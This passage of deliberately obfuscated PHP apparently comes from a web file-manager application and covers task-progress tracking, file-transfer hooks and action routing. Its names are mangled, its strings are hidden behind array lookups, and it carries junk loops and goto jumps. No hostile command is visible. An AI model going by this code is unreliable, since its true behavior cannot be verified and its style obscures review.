$this->task[$©ñ¶Ä¨ö[1653]] = timeFloat(); } public function end() { $öÆç™¯ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->task) { return; } if ($this->task[$öÆç™¯[1653]]) { self::valueSet($this->task[$öÆç™¯[407]], !1); } $êü–„—º = timeFloat() - $this->task[$öÆç™¯[1651]]; self::log($öÆç™¯[1661] . $this->task[$öÆç™¯[407]] . $öÆç™¯[1662] . $êü–„—º . $öÆç™¯[1663]); Hook::unbind($öÆç™¯[1611], array($this, $öÆç™¯[1657])); Hook::unbind($öÆç™¯[1658], array($this, $öÆç™¯[1659])); $this->endAfter(); $this->task = !1; } public function update($³ËœÈ = 0, $õÉìÅ„Á = false) { $–šâä§Ò =& $_SERVER[ĞÆÏ¡Îª]; $ÚçÜæúÒ =& $this->task; if (!$ÚçÜæúÒ) { return; } $ÚçÜæúÒ[$–šâä§Ò[1648]] += $³ËœÈ; $ÚçÜæúÒ[$–šâä§Ò[1652]] = timeFloat(); if ($ÚçÜæúÒ[$–šâä§Ò[781]]) { if ($ÚçÜæúÒ[$–šâä§Ò[781]] < $ÚçÜæúÒ[$–šâä§Ò[1648]]) { $ÚçÜæúÒ[$–šâä§Ò[781]] = $ÚçÜæúÒ[$–šâä§Ò[1648]]; } $Èü‰ç¿Ì = timeFloat() - $ÚçÜæúÒ[$–šâä§Ò[1651]] - $ÚçÜæúÒ[$–šâä§Ò[1654]]; if ($Èü‰ç¿Ì <= 0) { $Èü‰ç¿Ì = 0.001; } $ÚçÜæúÒ[$–šâä§Ò[1649]] = $ÚçÜæúÒ[$–šâä§Ò[1648]] / $ÚçÜæúÒ[$–šâä§Ò[781]]; $ÚçÜæúÒ[$–šâä§Ò[1650]] = $ÚçÜæúÒ[$–šâä§Ò[1648]] / $Èü‰ç¿Ì; if ($ÚçÜæúÒ[$–šâä§Ò[1649]] > 0) { $ÚçÜæúÒ[$–šâä§Ò[1655]] = $Èü‰ç¿Ì * (1 - $ÚçÜæúÒ[$–šâä§Ò[1649]]) / $ÚçÜæúÒ[$–šâä§Ò[1649]]; } $ÚçÜæúÒ[$–šâä§Ò[1655]] = $ÚçÜæúÒ[$–šâä§Ò[1655]] <= 0 ? 0 : $ÚçÜæúÒ[$–šâä§Ò[1655]]; } $this->updateAfter(); $ÔúÈÙÉ¡ = 0.2; if (timeFloat() - $ÚçÜæúÒ[$–šâä§Ò[1653]] < $ÔúÈÙÉ¡ && !$õÉìÅ„Á) { return; } $¤‡êÄ© = self::get($ÚçÜæúÒ[$–šâä§Ò[407]]); $’ÚóŒÜá = $¤‡êÄ©[$–šâä§Ò[745]]; if ($’ÚóŒÜá == self::STATYS_KILL) { $µ¹ùÔ¯Ë = array($–šâä§Ò[1664] => LNG($–šâä§Ò[1665]), $–šâä§Ò[1182] => !1); Cache::set($–šâä§Ò[1666] . $this->task[$–šâä§Ò[407]], $µ¹ùÔ¯Ë, 30); $this->onKill(); $this->end(); die; } else { if ($’ÚóŒÜá == self::STATYS_STOP) { $Ü“Œ÷Ê = 2; $¤‡êÄ©[$–šâä§Ò[1654]] += $Ü“Œ÷Ê; self::valueSet($ÚçÜæúÒ[$–šâä§Ò[407]], $¤‡êÄ©); sleep($Ü“Œ÷Ê); $this->update(); return; } } $ÚçÜæúÒ[$–šâä§Ò[745]] = $’ÚóŒÜá ? $’ÚóŒÜá : $ÚçÜæúÒ[$–šâä§Ò[745]]; $ÚçÜæúÒ[$–šâä§Ò[1654]] = $¤‡êÄ©[$–šâä§Ò[1654]] ? $¤‡êÄ©[$–šâä§Ò[1654]] : 0; $ÚçÜæúÒ[$–šâä§Ò[1653]] = timeFloat(); Hook::trigger($–šâä§Ò[1667], $ÚçÜæúÒ); self::valueSet($ÚçÜæúÒ[$–šâä§Ò[407]], $ÚçÜæúÒ); } public function onKillSet($±æ‡åÅ, $¯šä¸ã = array()) { $this->onKillCall = array($±æ‡åÅ, $¯šä¸ã); } public function onKill() { $‰¤œøñ¤ =& $_SERVER[ĞÆÏ¡Îª]; self::log($‰¤œøñ¤[1661] . $this->task[$‰¤œøñ¤[407]] . $‰¤œøñ¤[1668]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($±×’±¬Ô) { $å£ğ¦“Ø =& $_SERVER[ĞÆÏ¡Îª]; Cache::set($å£ğ¦“Ø[1666] . $this->task[$å£ğ¦“Ø[407]], $±×’±¬Ô, 60); return $±×’±¬Ô; } public static function get($›ü«¯é) { $Ô‚ùëì½ =& $_SERVER[ĞÆÏ¡Îª]; $‘şÒé¡¸ = self::valueGet($›ü«¯é); if (is_array($‘şÒé¡¸) && $‘şÒé¡¸[$Ô‚ùëì½[1669]]) { $¨¤Í‰—õ = ActionApply($‘şÒé¡¸[$Ô‚ùëì½[1669]], array($‘şÒé¡¸)); $‘şÒé¡¸ = is_array($¨¤Í‰—õ) ? $¨¤Í‰—õ : $‘şÒé¡¸; } return $‘şÒé¡¸; } public static function listData() { $Æ’–°Šö = self::valueGet(); return array_sort_by($Æ’–°Šö, $_SERVER[ĞÆÏ¡Îª][1651], !0); } public static function kill($üüõ°¢Ğ) { return self::changeStatus($üüõ°¢Ğ, self::STATYS_KILL); } public static function stop($î¦Òµø) { return self::changeStatus($î¦Òµø, self::STATYS_STOP); } public static function restart($€²›™ß) { return self::changeStatus($€²›™ß, self::STATYS_RUNNING); } public static function killAll() { $¬ğ¾Œåû =& $_SERVER[ĞÆÏ¡Îª]; $Šƒˆû = self::listData(); foreach ($Šƒˆû as $Ş¹Ã°·¦) { self::kill($Ş¹Ã°·¦[$¬ğ¾Œåû[407]]); } sleep(2); foreach ($Šƒˆû as $Ş¹Ã°·¦) { self::valueSet($Ş¹Ã°·¦[$¬ğ¾Œåû[407]], !1); } } private static function changeStatus($‰˜•‹ŞÆ, $¦ê«ÖóÅ) { $öè“Ÿö =& $_SERVER[ĞÆÏ¡Îª]; $¿†ÙÚ…’ = self::valueGet($‰˜•‹ŞÆ); if (!$¿†ÙÚ…’) { return !1; } $¿†ÙÚ…’[$öè“Ÿö[745]] = $¦ê«ÖóÅ; self::valueSet($‰˜•‹ŞÆ, $¿†ÙÚ…’); self::log($öè“Ÿö[1670] . $¿†ÙÚ…’[$öè“Ÿö[407]] . $öè“Ÿö[1671] . $¦ê«ÖóÅ); return !0; } public static function valueGet($•ğ¨Â™  = false) { $÷í˜ßæ³ =& $_SERVER[ĞÆÏ¡Îª]; if ($•ğ¨Â™ ) { $·éË…£î = Model($÷í˜ßæ³[456])->where(array($÷í˜ßæ³[94] => $•ğ¨Â™ , $÷í˜ßæ³[33] => $÷í˜ßæ³[1062]))->find(); return $·éË…£î ? json_decode($·éË…£î[$÷í˜ßæ³[383]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ÿ‰©Ñª  = false) { $‚œÓ‚¯Û =& $_SERVER[ĞÆÏ¡Îª]; $ÓáĞ‡ÙÍ = array($‚œÓ‚¯Û[33] => $‚œÓ‚¯Û[1062]); if ($Ÿ‰©Ñª ) { $ÓáĞ‡ÙÍ[$‚œÓ‚¯Û[1647]] = $Ÿ‰©Ñª ; } $™Õ‘Úà = Model($‚œÓ‚¯Û[456])->where($ÓáĞ‡ÙÍ)->select(); $™Õ‘Úà = $™Õ‘Úà ? $™Õ‘Úà : array(); foreach ($™Õ‘Úà as $êÃêäªß => $Òë¶®è¨) { $™Õ‘Úà[$êÃêäªß] = json_decode($Òë¶®è¨[$‚œÓ‚¯Û[383]], !0); } return $™Õ‘Úà; } public static function valueSet($Óâ·çæ³, $ÓÈÉÕ·) { $Ìæ¢Õ³œ =& $_SERVER[ĞÆÏ¡Îª]; if (!$ÓÈÉÕ·) { return Model($Ìæ¢Õ³œ[456])->where(array($Ìæ¢Õ³œ[94] => $Óâ·çæ³, $Ìæ¢Õ³œ[33] => $Ìæ¢Õ³œ[1062]))->delete(); } $Şì”é‚ = json_encode($ÓÈÉÕ·); if (!$Şì”é‚) { ob_start(); var_dump($ÓÈÉÕ·); $Ñ¢äİéÖ = ob_get_clean(); self::log($Ìæ¢Õ³œ[1672] . json_encode_force($Ñ¢äİéÖ)); } if (!$Óâ·çæ³ || !$ÓÈÉÕ·[$Ìæ¢Õ³œ[407]]) { return !1; } $ÚŒù®û = array($Ìæ¢Õ³œ[33] => $Ìæ¢Õ³œ[1062], $Ìæ¢Õ³œ[1647] => USER_ID, $Ìæ¢Õ³œ[94] => $Óâ·çæ³, $Ìæ¢Õ³œ[383] => $Şì”é‚); $¿íµ’€ = $Ìæ¢Õ³œ[1673]; CacheLock::lock($¿íµ’€); Model($Ìæ¢Õ³œ[456])->add($ÚŒù®û, array(), !0); CacheLock::unlock($¿íµ’€); } public static function log($˜Ú“ôİß) { if (!GLOBAL_DEBUG) { return; } write_log($˜Ú“ôİß, $_SERVER[ĞÆÏ¡Îª][1674]); } } class TaskFileTransfer extends Task { protected function startAfter() { $şª¯­¤À =& $_SERVER[ĞÆÏ¡Îª]; $œØÈÒ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($şª¯­¤À[1675], array($this, $şª¯­¤À[1676])); Hook::bind($şª¯­¤À[1206], array($this, $şª¯­¤À[1677])); Hook::bind($şª¯­¤À[1678], array($this, $şª¯­¤À[1679])); Hook::bind($şª¯­¤À[613], array($this, $şª¯­¤À[1680])); Hook::bind($şª¯­¤À[614], array($this, $şª¯­¤À[1681])); Hook::bind($şª¯­¤À[619], array($this, $şª¯­¤À[1682])); Hook::bind($şª¯­¤À[620], array($this, $şª¯­¤À[1683])); Hook::bind($şª¯­¤À[616], array($this, $şª¯­¤À[1684])); Hook::bind($şª¯­¤À[617], array($this, $şª¯­¤À[1685])); Hook::bind($şª¯­¤À[583], array($this, $şª¯­¤À[1686])); Hook::bind($şª¯­¤À[580], array($this, $şª¯­¤À[1686])); Hook::bind($şª¯­¤À[585], array($this, $şª¯­¤À[1686])); Hook::bind($şª¯­¤À[587], array($this, $şª¯­¤À[1686])); Hook::bind($şª¯­¤À[589], array($this, $şª¯­¤À[1686])); Hook::bind($şª¯­¤À[1687], array($this, $şª¯­¤À[1688])); Hook::bind($şª¯­¤À[606], array($this, $şª¯­¤À[1689])); $this->sourceModelCopyFlag = !1; Hook::bind($şª¯­¤À[1690], array($this, $şª¯­¤À[1691])); Hook::bind($şª¯­¤À[1692], array($this, $şª¯­¤À[1693])); Hook::bind($şª¯­¤À[1694], array($this, $şª¯­¤À[1695])); $œØÈÒ[$şª¯­¤À[1696]] = LNG($şª¯­¤À[1697]); $œØÈÒ[$şª¯­¤À[1698]] = 0; $œØÈÒ[$şª¯­¤À[1699]] = 0; $œØÈÒ[$şª¯­¤À[1055]] = $şª¯­¤À[12]; $œØÈÒ[$şª¯­¤À[1700]] = $şª¯­¤À[12]; $œØÈÒ[$şª¯­¤À[1701]] = 0; $œØÈÒ[$şª¯­¤À[1702]] = 0; $œØÈÒ[$şª¯­¤À[1703]] = 0; if (!$œØÈÒ[$şª¯­¤À[1546]]) { $œØÈÒ[$şª¯­¤À[1546]] = LNG($şª¯­¤À[1704]); } } protected function endAfter() { $ßËÌ…Ó =& $_SERVER[ĞÆÏ¡Îª]; Hook::unbind($ßËÌ…Ó[1675], array($this, $ßËÌ…Ó[1676])); Hook::unbind($ßËÌ…Ó[1206], array($this, $ßËÌ…Ó[1677])); Hook::unbind($ßËÌ…Ó[1678], array($this, $ßËÌ…Ó[1679])); Hook::unbind($ßËÌ…Ó[613], array($this, $ßËÌ…Ó[1680])); Hook::unbind($ßËÌ…Ó[614], array($this, $ßËÌ…Ó[1681])); Hook::unbind($ßËÌ…Ó[619], array($this, $ßËÌ…Ó[1682])); Hook::unbind($ßËÌ…Ó[620], array($this, $ßËÌ…Ó[1683])); Hook::unbind($ßËÌ…Ó[616], array($this, $ßËÌ…Ó[1684])); Hook::unbind($ßËÌ…Ó[617], array($this, $ßËÌ…Ó[1685])); Hook::unbind($ßËÌ…Ó[583], array($this, $ßËÌ…Ó[1686])); Hook::unbind($ßËÌ…Ó[580], array($this, $ßËÌ…Ó[1686])); Hook::unbind($ßËÌ…Ó[585], array($this, $ßËÌ…Ó[1686])); Hook::unbind($ßËÌ…Ó[587], array($this, $ßËÌ…Ó[1686])); Hook::unbind($ßËÌ…Ó[589], array($this, $ßËÌ…Ó[1686])); Hook::unbind($ßËÌ…Ó[1687], array($this, $ßËÌ…Ó[1688])); Hook::unbind($ßËÌ…Ó[606], array($this, $ßËÌ…Ó[1689])); Hook::unbind($ßËÌ…Ó[1690], array($this, $ßËÌ…Ó[1691])); Hook::unbind($ßËÌ…Ó[1692], array($this, $ßËÌ…Ó[1693])); Hook::unbind($ßËÌ…Ó[1694], array($this, $ßËÌ…Ó[1695])); } public function copyMoveStart($É±ãù±™, $€òğ‹¿İ, $ÚÂıæè, $¾äŒŸ—¥) { $¯¨†©ùù =& $_SERVER[ĞÆÏ¡Îª]; self::log($¯¨†©ùù[1705] . $€òğ‹¿İ . $¯¨†©ùù[70] . $¾äŒŸ—¥); $³ÙÑ²ü = rtrim(TEMP_FILES, $¯¨†©ùù[8]); if (substr($€òğ‹¿İ, 0, strlen($³ÙÑ²ü)) == $³ÙÑ²ü) { return; } if (substr($¾äŒŸ—¥, 0, strlen($³ÙÑ²ü)) == $³ÙÑ²ü) { return; } $”¨®äÙú =& $this->task; $”¨®äÙú[$¯¨†©ùù[1706]] = KodIO::transferType($É±ãù±™, $ÚÂıæè); $this->update(); } public function updateAfter() { $âŠñí­Õ =& $_SERVER[ĞÆÏ¡Îª]; $µóªğİ€ =& $this->task; if (!$µóªğİ€[$âŠñí­Õ[758]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($µóªğİ€[$âŠñí­Õ[1706]] == $âŠñí­Õ[1295]) { return; } self::updateTask($µóªğİ€); } private static function updateTask(&$¦¡›ÃäŞ) { $¬²¤ÏÛè =& $_SERVER[ĞÆÏ¡Îª]; if ($¦¡›ÃäŞ[$¬²¤ÏÛè[1706]] == $¬²¤ÏÛè[1190] || $¦¡›ÃäŞ[$¬²¤ÏÛè[1706]] == $¬²¤ÏÛè[107]) { if ($¦¡›ÃäŞ[$¬²¤ÏÛè[1700]]) { $¦¡›ÃäŞ[$¬²¤ÏÛè[1703]] = $¦¡›ÃäŞ[$¬²¤ÏÛè[1702]] + $¦¡›ÃäŞ[$¬²¤ÏÛè[1699]]; } } else { if ($¦¡›ÃäŞ[$¬²¤ÏÛè[1706]] == $¬²¤ÏÛè[1296]) { if ($¦¡›ÃäŞ[$¬²¤ÏÛè[1700]] == $¬²¤ÏÛè[1190]) { $¦¡›ÃäŞ[$¬²¤ÏÛè[1703]] = $¦¡›ÃäŞ[$¬²¤ÏÛè[1702]] + $¦¡›ÃäŞ[$¬²¤ÏÛè[1699]] * 0.5; } else { if ($¦¡›ÃäŞ[$¬²¤ÏÛè[1700]] == $¬²¤ÏÛè[107]) { $¦¡›ÃäŞ[$¬²¤ÏÛè[1703]] = $¦¡›ÃäŞ[$¬²¤ÏÛè[1702]] + $¦¡›ÃäŞ[$¬²¤ÏÛè[1698]] * 0.5 + $¦¡›ÃäŞ[$¬²¤ÏÛè[1699]] * 0.5; } } } } $¦¡›ÃäŞ[$¬²¤ÏÛè[1649]] = $¦¡›ÃäŞ[$¬²¤ÏÛè[1703]] / $¦¡›ÃäŞ[$¬²¤ÏÛè[758]]; if ($¦¡›ÃäŞ[$¬²¤ÏÛè[1649]] > 0) { $ğ¿’»¸ = timeFloat() - $¦¡›ÃäŞ[$¬²¤ÏÛè[1651]] - $¦¡›ÃäŞ[$¬²¤ÏÛè[1654]]; $¦¡›ÃäŞ[$¬²¤ÏÛè[1655]] = $ğ¿’»¸ * (1 - $¦¡›ÃäŞ[$¬²¤ÏÛè[1649]]) / $¦¡›ÃäŞ[$¬²¤ÏÛè[1649]]; } } public function addPath($€ÛÒµÙ) { $ ¾ªÛÚË =& $_SERVER[ĞÆÏ¡Îª]; if (!$€ÛÒµÙ) { return; } $ç±Ìª¡Ò =& $this->task; $Ó½ƒ»»À = IO::infoWithChildren($€ÛÒµÙ); $šêûùÕÈ = $ç±Ìª¡Ò[$ ¾ªÛÚË[1707]] ? $ç±Ìª¡Ò[$ ¾ªÛÚË[1707]][$ ¾ªÛÚË[1708]] : 0; $ç±Ìª¡Ò[$ ¾ªÛÚË[1707]] = array($ ¾ªÛÚË[1708] => $šêûùÕÈ + 1, $ ¾ªÛÚË[429] => $Ó½ƒ»»À[$ ¾ªÛÚË[32]], $ ¾ªÛÚË[84] => $Ó½ƒ»»À[$ ¾ªÛÚË[84]], $ ¾ªÛÚË[528] => $Ó½ƒ»»À[$ ¾ªÛÚË[528]] ? $Ó½ƒ»»À[$ ¾ªÛÚË[528]] : $Ó½ƒ»»À[$ ¾ªÛÚË[84]]); if ($Ó½ƒ»»À[$ ¾ªÛÚË[33]] == $ ¾ªÛÚË[199]) { $ç±Ìª¡Ò[$ ¾ªÛÚË[781]] += 1; } else { $ç±Ìª¡Ò[$ ¾ªÛÚË[781]] += $Ó½ƒ»»À[$ ¾ªÛÚË[79]][$ ¾ªÛÚË[77]]; if ($Ó½ƒ»»À[$ ¾ªÛÚË[411]]) { $ç±Ìª¡Ò[$ ¾ªÛÚË[781]] += $Ó½ƒ»»À[$ ¾ªÛÚË[79]][$ ¾ªÛÚË[78]] + 1; } } $ç±Ìª¡Ò[$ ¾ªÛÚË[758]] += $Ó½ƒ»»À[$ ¾ªÛÚË[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($äÄƒ«ø) { } public function sourceAddHashEnd($üÇ¹Öƒ) { } public function sourceAddFileStart($ë¼ßÕà„) { $¹©ÃÄ÷ç =& $_SERVER[ĞÆÏ¡Îª]; $¯ó–å° =& $this->task; $¯ó–å°[$¹©ÃÄ÷ç[1698]] = $ë¼ßÕà„[$¹©ÃÄ÷ç[76]]; $¯ó–å°[$¹©ÃÄ÷ç[1696]] = $ë¼ßÕà„[$¹©ÃÄ÷ç[32]]; $¯ó–å°[$¹©ÃÄ÷ç[1055]] = $ë¼ßÕà„[$¹©ÃÄ÷ç[32]]; $¯ó–å°[$¹©ÃÄ÷ç[1709]] = $ë¼ßÕà„[$¹©ÃÄ÷ç[84]]; $this->update(); } public function sourceAddFileEnd($«ÏÏ¡’) { $Æø²¡à‡ =& $_SERVER[ĞÆÏ¡Îª]; $Ùşå§ûË =& $this->task; $Ùşå§ûË[$Æø²¡à‡[1703]] += $«ÏÏ¡’[$Æø²¡à‡[76]]; $Ùşå§ûË[$Æø²¡à‡[1709]] = $«ÏÏ¡’[$Æø²¡à‡[84]]; $this->update(1); } public function copyFileStart($ñÙ…÷½ª, $ĞÛØ¢Ÿ¿, $‚ĞêÙÀ, $æˆ¥·, $¿ü™÷“, $•ä†ØË) { $¤ £•·¥ =& $_SERVER[ĞÆÏ¡Îª]; $É…Õ¸ôç = $¿ü™÷“; if ($É…Õ¸ôç == $GLOBALS[$¤ £•·¥[1710]]) { $É…Õ¸ôç = $GLOBALS[$¤ £•·¥[1711]]; } $GLOBALS[$¤ £•·¥[1711]] = $¿ü™÷“; $GLOBALS[$¤ £•·¥[1710]] = $•ä†ØË; $ç…¢ˆÊã =& $this->task; $ç…¢ˆÊã[$¤ £•·¥[1696]] = $É…Õ¸ôç; $ç…¢ˆÊã[$¤ £•·¥[1698]] = (int) $ñÙ…÷½ª->size($ĞÛØ¢Ÿ¿); $ç…¢ˆÊã[$¤ £•·¥[1699]] = 0; $ç…¢ˆÊã[$¤ £•·¥[1055]] = $¤ £•·¥[12]; $ç…¢ˆÊã[$¤ £•·¥[1700]] = $¤ £•·¥[12]; $ç…¢ˆÊã[$¤ £•·¥[1701]] = 0; $×ıòšš¬ = $ç…¢ˆÊã[$¤ £•·¥[1698]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ç…¢ˆÊã[$¤ £•·¥[407]] . $¤ £•·¥[1712]); if ($×ıòšš¬ && file_exists(get_path_father($æˆ¥·))) { Cache::set($ç…¢ˆÊã[$¤ £•·¥[407]] . $¤ £•·¥[1712], $æˆ¥·); $ç…¢ˆÊã[$¤ £•·¥[1669]] = array($¤ £•·¥[1713], $¤ £•·¥[1714]); } $this->update(0, $×ıòšš¬); } public static function updateCopyLocalFileSize($È•°“¯´) { $…“»â =& $_SERVER[ĞÆÏ¡Îª]; $Âû®¢ = Cache::get($È•°“¯´[$…“»â[407]] . $…“»â[1712]); if (!$Âû®¢ || !file_exists($Âû®¢)) { return $È•°“¯´; } $È•°“¯´[$…“»â[1699]] = @filesize($Âû®¢); $È•°“¯´[$…“»â[1703]] += $È•°“¯´[$…“»â[1699]]; self::updateTask($È•°“¯´); return $È•°“¯´; } public function copyFileEnd($á¤Ùğ¾, $ÇÇ‹‘º÷, $®ËğáÔ€, $·‘Ãõ¯©, $‚…†ãÅÃ, $ Í¯ØÇ) { $şÇôİ´Ô =& $_SERVER[ĞÆÏ¡Îª]; $íÂËçÔâ =& $this->task; $íÂËçÔâ[$şÇôİ´Ô[1699]] = $íÂËçÔâ[$şÇôİ´Ô[1698]]; $íÂËçÔâ[$şÇôİ´Ô[1700]] = $şÇôİ´Ô[12]; unset($íÂËçÔâ[$şÇôİ´Ô[1669]]); if ($‚…†ãÅÃ == $íÂËçÔâ[$şÇôİ´Ô[1696]]) { $íÂËçÔâ[$şÇôİ´Ô[1702]] += $íÂËçÔâ[$şÇôİ´Ô[1698]]; $íÂËçÔâ[$şÇôİ´Ô[1703]] = $íÂËçÔâ[$şÇôİ´Ô[1702]]; $á€·Ü¢ô = 1; if (isset($íÂËçÔâ[$şÇôİ´Ô[1709]]) && $íÂËçÔâ[$şÇôİ´Ô[1709]] == $ÇÇ‹‘º÷) { $á€·Ü¢ô = 0; } $this->update($á€·Ü¢ô); } else { $this->update(); $íÂËçÔâ[$şÇôİ´Ô[1699]] = 0; } Cache::remove($íÂËçÔâ[$şÇôİ´Ô[407]] . $şÇôİ´Ô[1712]); self::log($şÇôİ´Ô[1715] . $ÇÇ‹‘º÷ . $şÇôİ´Ô[70] . $·‘Ãõ¯© . $şÇôİ´Ô[231] . $‚…†ãÅÃ . $şÇôİ´Ô[1716] . $íÂËçÔâ[$şÇôİ´Ô[1696]]); } public function updateFileEnd($Â½Ú“ŸÇ, $èƒÇÚ¥‹) { $„ÔÉÓåè =& $_SERVER[ĞÆÏ¡Îª]; $ïè—ëõ =& $this->task; $ïè—ëõ[$„ÔÉÓåè[1696]] = $Â½Ú“ŸÇ; $ïè—ëõ[$„ÔÉÓåè[1698]] = $èƒÇÚ¥‹; $ïè—ëõ[$„ÔÉÓåè[1702]] += $èƒÇÚ¥‹; $ïè—ëõ[$„ÔÉÓåè[1703]] = $ïè—ëõ[$„ÔÉÓåè[1702]]; $this->update(1); self::log($„ÔÉÓåè[1717] . $Â½Ú“ŸÇ); } public function sourceModelCopy($×œåÚóü) { $¡Ì¿¹ÕÒ =& $_SERVER[ĞÆÏ¡Îª]; $‹òÑŒ®‹ = $×œåÚóü[0]; $¼ÖáŞà = $×œåÚóü[1]; $•€ÀıŠ¼ =& $this->task; $this->sourceModelCopyFlag = !0; $ëêĞ¬÷ = 0; switch ($‹òÑŒ®‹) { case $¡Ì¿¹ÕÒ[581]: $ëêĞ¬÷ = 1; break; case $¡Ì¿¹ÕÒ[584]: $•€ÀıŠ¼[$¡Ì¿¹ÕÒ[1696]] = $¼ÖáŞà[$¡Ì¿¹ÕÒ[32]]; break; case $¡Ì¿¹ÕÒ[586]: $ëêĞ¬÷ = intval($×œåÚóü[$¡Ì¿¹ÕÒ[388]] * 0.4); break; case $¡Ì¿¹ÕÒ[588]: $ëêĞ¬÷ = intval($×œåÚóü[$¡Ì¿¹ÕÒ[388]] * 0.2); break; case $¡Ì¿¹ÕÒ[590]: $ëêĞ¬÷ = intval($×œåÚóü[$¡Ì¿¹ÕÒ[388]] * 0.4); break; } $this->update($ëêĞ¬÷); $this->sourceModelCopyFlag = !1; } public function sourceRemove($úíÅ„ß¥, $ÌÔ«æ®„) { $Àı®ú‰‘ =& $_SERVER[ĞÆÏ¡Îª]; $this->sourceModelCopyFlag = !0; $ÊöÏñÏ… = 1; if (isset($úíÅ„ß¥[$Àı®ú‰‘[79]])) { $ÊöÏñÏ… = $úíÅ„ß¥[$Àı®ú‰‘[79]][$Àı®ú‰‘[77]]; $ÊöÏñÏ… = $ÊöÏñÏ… + $úíÅ„ß¥[$Àı®ú‰‘[79]][$Àı®ú‰‘[78]] + 1; } $this->update($ÊöÏñÏ…); $this->sourceModelCopyFlag = !1; } public function sourceMove($¼‚ÎÛä’) { $this->sourceRemove($¼‚ÎÛä’, !1); } public function curlProgress($ÅÌıìØ–, $ ñ¯éóõ, $ĞÑ è“ƒ, $Í§œäî­, $ú›³Áœâ) { $¦ˆ»íìú =& $_SERVER[ĞÆÏ¡Îª]; $¾´Šê¦í =& $this->task; if ($ú›³Áœâ > 0) { $¾´Šê¦í[$¦ˆ»íìú[1055]] = $¦ˆ»íìú[1718]; $¾´Šê¦í[$¦ˆ»íìú[1700]] = $¦ˆ»íìú[107]; if ($¾´Šê¦í[$¦ˆ»íìú[1698]]) { $¾´Šê¦í[$¦ˆ»íìú[1699]] = $ú›³Áœâ; } if ($¾´Šê¦í[$¦ˆ»íìú[1701]]) { $¾´Šê¦í[$¦ˆ»íìú[1699]] = $ú›³Áœâ + $¾´Šê¦í[$¦ˆ»íìú[1701]]; } } else { if ($ĞÑ è“ƒ > 0) { if ($¾´Šê¦í[$¦ˆ»íìú[1698]] == $ ñ¯éóõ) { $¾´Šê¦í[$¦ˆ»íìú[1699]] = $ĞÑ è“ƒ; $¾´Šê¦í[$¦ˆ»íìú[1055]] = $¦ˆ»íìú[1719]; $¾´Šê¦í[$¦ˆ»íìú[1700]] = $¦ˆ»íìú[1190]; } } } $this->update(); } public function curlProgressStart($©‹ïÏÆ) { } public function curlProgressEnd($Ø˜ÀĞ¾æ) { $Ğ©¸ğÇ¼ =& $_SERVER[ĞÆÏ¡Îª]; $Şùö†µ½ =& $this->task; $ºª¯¤™Ô = curl_getinfo($Ø˜ÀĞ¾æ); $ñ–ôÔ‹µ = $ºª¯¤™Ô[$Ğ©¸ğÇ¼[1720]]; if ($ñ–ôÔ‹µ == -1) { $ñ–ôÔ‹µ = $ºª¯¤™Ô[$Ğ©¸ğÇ¼[1721]]; } if ($Şùö†µ½[$Ğ©¸ğÇ¼[1700]] == $Ğ©¸ğÇ¼[107] && $ñ–ôÔ‹µ) { $Şùö†µ½[$Ğ©¸ğÇ¼[1701]] += $ñ–ôÔ‹µ; } $this->update(); } } goto cíäíŒŠËØ; fî‹Š¹ÂŠ: $ziqmhcxlpg = $_SERVER[ĞÆÏ¡Îª][627]; class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\x69\156\144\145\x78"; private $defaultAction = "\151\156\144\x65\170"; function __construct() { } public function setDefault($¸Ñ—ÛĞ¢) { $½úœ„‘“ =& $_SERVER[ĞÆÏ¡Îª]; $Œ¼«ñ•— =& $_SERVER[û†ìªƒĞ]; $ˆƒÈ´åû = explode($Œ¼«ñ•—[0], trim($¸Ñ—ÛĞ¢, $Œ¼«ñ•—[0])); $this->defaultModule = $ˆƒÈ´åû[0] ? $ˆƒÈ´åû[0] : $this->defaultModule; $áÌË¸Ô¹ = $½úœ„‘“[628]; if (strlen($áÌË¸Ô¹) < $½úœ„‘“[624]) { die; } $this->defaultController = $ˆƒÈ´åû[1] ? $ˆƒÈ´åû[1] : $this->defaultController; $this->defaultAction = $ˆƒÈ´åû[2] ? $ˆƒÈ´åû[2] : $this->defaultAction; $this->giuz0be82f61($Œ¼«ñ•—[1], array($this, $Œ¼«ñ•—[2])); } public function appRun($òªİ©ˆË) { $—Ô©Óã =& $_SERVER[ĞÆÏ¡Îª]; $»“¯ÊÌ§ =& $_SERVER[û†ìªƒĞ]; $–åí©–Ú = explode($»“¯ÊÌ§[0], $òªİ©ˆË); $¤——±õ¦ = strtolower($–åí©–Ú[0]); $¢ê®Úù« = $»“¯ÊÌ§[3]; if ($¤——±õ¦ == $»“¯ÊÌ§[4]) { $¢ê®Úù« = $»“¯ÊÌ§[5]; $–åí©–Ú[0] = $»“¯ÊÌ§[6]; $–åí©–Ú[1] = $–åí©–Ú[1] . $»“¯ÊÌ§[7]; $òªİ©ˆË = join($»“¯ÊÌ§[0], $–åí©–Ú); $òªİ©ˆË = trim($òªİ©ˆË, $»“¯ÊÌ§[0]); } call_user_func(array($»“¯ÊÌ§[8], $»“¯ÊÌ§[9]), $¢ê®Úù« . $»“¯ÊÌ§[10], $òªİ©ˆË); ActionCall($òªİ©ˆË); $¨Í„ÇªÜ = $—Ô©Óã[629]; while ($¨Í„ÇªÜ < $—Ô©Óã[624]) { if ($¨Í„ÇªÜ >= 0) { break; } $¨Í„ÇªÜ++; } call_user_func(array($»“¯ÊÌ§[8], $»“¯ÊÌ§[9]), $¢ê®Úù« . $»“¯ÊÌ§[11], $òªİ©ˆË); $£µç¡ü = $—Ô©Óã[630]; while (strlen($£µç¡ü) < $—Ô©Óã[624]) { if (!$£µç¡ü) { break; } $£µç¡ü++; } } private function autorun() { $ñºñ‹Àş =& $_SERVER[û†ìªƒĞ]; global $config; if (count($config[$ñºñ‹Àş[12]]) == 0) { return; } foreach ($config[$ñºñ‹Àş[12]] as $ñßÍ‰ìÌ => $ƒ—Ÿë¶ï) { $this->appRun($ƒ—Ÿë¶ï); 